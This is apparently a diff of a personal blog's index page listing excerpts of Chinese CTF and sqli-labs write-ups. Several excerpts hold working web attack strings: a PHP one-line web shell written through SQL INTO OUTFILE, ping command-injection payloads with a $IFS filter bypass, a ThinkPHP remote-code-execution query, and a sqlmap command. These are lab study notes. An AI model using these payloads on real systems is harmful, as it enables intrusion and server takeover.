@@ -187,7 +187,211 @@
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/19/BUU005/" target="_self">
+        <a href="/2021/01/21/level7/" target="_blank">
+          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Level7">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/01/21/level7/">Level7</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/01/21/level7/">
+          
+          
+            
+          
+          level7GET-Dump into outfile-String导出文件GET字符型注入     
+
+相关知识点      
+
+select into outfile命令作用将查询结果输出保存到一个文件中写入一句话语句：select “&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;” into outfile “XXX\test.php”
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-01-21 17:57" pubdate>
+              2021-01-21
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/note/">note</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/01/21/BUU007/" target="_blank">
+          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题007">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/01/21/BUU007/">BUU每日一题007</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/01/21/BUU007/">
+          
+          
+            
+          
+          七、
+题目：[ACTF2020 新生赛]Exec    
+分析和昨天一样，又是一道ping的题目，;ls一下，发现一个index.php，再试一下;ls -a也没有flag相关的，这道题似乎没有什么过滤啊，查看根目录吧ls /,发现flag文件之后cat得到flag。          
+解payload：cat /flag
+
+
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-01-21 14:16" pubdate>
+              2021-01-21
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">wp</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/01/20/BUU006/" target="_blank">
+          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题006">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/01/20/BUU006/">BUU每日一题006</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/01/20/BUU006/">
+          
+          
+            
+          
+          六、
+题目：[GXYCTF2019]Ping Ping Ping   
+分析ls一下，得到可能含有flag的文件ping的命令执行，经检验，空格和flag被过滤空格可以用$IFS代替；flag可以用变量拼接绕过         
+解     
+*payload：**/?ip=127.0.0.1;a=ag.php;b=fl;cat$IFS$b$a得到flag另外/?ip=127.0.0.1;cat$
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-01-20 16:33" pubdate>
+              2021-01-20
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">wp</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/01/19/level5/" target="_blank">
+          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Level5">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/01/19/level5/">Level5</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/01/19/level5/">
+          
+          
+            
+          
+          level5
+分析GET-Double injection-Single Quotes-StringGET-双重注入-单引号-字符串输入?id=1，输出为：?id=22没有输出；?id=1&#39;报错；根据题目，应该用双重注入：一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询，如select concat((select database()));几个函数：    
+
+
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-01-19 17:38" pubdate>
+              2021-01-19
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/note/">note</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/01/19/BUU005/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题005">
         </a>
       </div>
@@ -236,7 +440,7 @@
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/18/leve2/" target="_self">
+        <a href="/2021/01/18/leve2/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Leve2">
         </a>
       </div>
@@ -285,7 +489,7 @@ sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security 
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/18/BUU004/" target="_self">
+        <a href="/2021/01/18/BUU004/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题004">
         </a>
       </div>
@@ -337,7 +541,7 @@ sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security 
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/17/leve1/" target="_self">
+        <a href="/2021/01/17/leve1/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Level1~~level4">
         </a>
       </div>
@@ -385,7 +589,7 @@ sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security 
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/17/BUU003/" target="_self">
+        <a href="/2021/01/17/BUU003/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题003">
         </a>
       </div>
@@ -437,7 +641,7 @@ sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security 
     
     
       <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/16/BUU002/" target="_self">
+        <a href="/2021/01/16/BUU002/" target="_blank">
           <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题002">
         </a>
       </div>
@@ -478,241 +682,6 @@ sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security 
             <i class="iconfont icon-tags"></i>
             
               <a href="/tags/wp/">wp</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-      <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/15/shuashua/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Shuashua">
-        </a>
-      </div>
-    
-    <article class="col-12 col-md-8 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/01/15/shuashua/">Shuashua</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/01/15/shuashua/">
-          
-          
-            
-          
-          php_rce
-题目：          
-解摸索了半天，还是没有找到有价值的信息，看了别人的WP后知道原来这是Think PHP的一个远程代码执行漏洞：
- ? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）         
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-01-15 17:35" pubdate>
-              2021-01-15
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">wp</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-      <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2021/01/15/BUU001/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="BUU每日一题001">
-        </a>
-      </div>
-    
-    <article class="col-12 col-md-8 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/01/15/BUU001/">BUU每日一题001</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/01/15/BUU001/">
-          
-          
-            
-          
-          一、
-题目： PHP代码审计
-
-页面一个表情，查看源代码
-访问source.php,得到PHP代码     
-		&lt;?php
-  		 highlight_file(__FILE__);
-   		class emmm
-   		&#123;
-       		public static function checkFile(&amp;$page)
-      	 		&#123;
-	   
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-01-15 13:11" pubdate>
-              2021-01-15
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/wp/">wp</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">wp</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-      <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2020/12/06/SSRFWP/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="SSRF--WP">
-        </a>
-      </div>
-    
-    <article class="col-12 col-md-8 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2020/12/06/SSRFWP/">SSRF--WP</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2020/12/06/SSRFWP/">
-          
-          
-            
-          
-          SSRF–WP题目：        
-            啊这，这怎么...这file_get_contents()有啥用呢
-&lt;?php
-    echo&#39;&lt;center&gt;&lt;strong&gt;啊这，这怎么...这file_get_contents()有啥用呢&lt;/strong&gt;&lt;/center&gt;&#39;;
-    highlight_f
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2020-12-06 10:31" pubdate>
-              2020-12-06
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/WP/">WP</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/WP/">WP</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-      <div class="col-12 col-md-4 m-auto index-img">
-        <a href="/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_self">
-          <img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152227451.jpg" srcset="/img/loading.gif" alt="Php伪协议">
-        </a>
-      </div>
-    
-    <article class="col-12 col-md-8 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">Php伪协议</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2020/12/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-          
-          
-            
-          
-          PHP伪协议
-PHP伪协议事实上就是支持的协议与封装协议。
-首先，介绍一些CTF中常见的文件包含函数：
-1.include：包含并对给定的文件进行计算。
-2.require：用于引入或者包含外部php文件。
-include和require的区别：include引入文件报错后会继续执行代码，而require引入文件时，遇到错误后就会停止运行下面的代码。        
-
-
-3.include_onc
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2020-12-04 21:54" pubdate>
-              2020-12-04
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/NOTE/">NOTE</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/NOTE/">NOTE</a>
             
           </div>
         
@@ -819,6 +788,8 @@ include和require的区别：include引入文件报错后会继续执行代码�
 
 
 
+  
+    
   
 
 
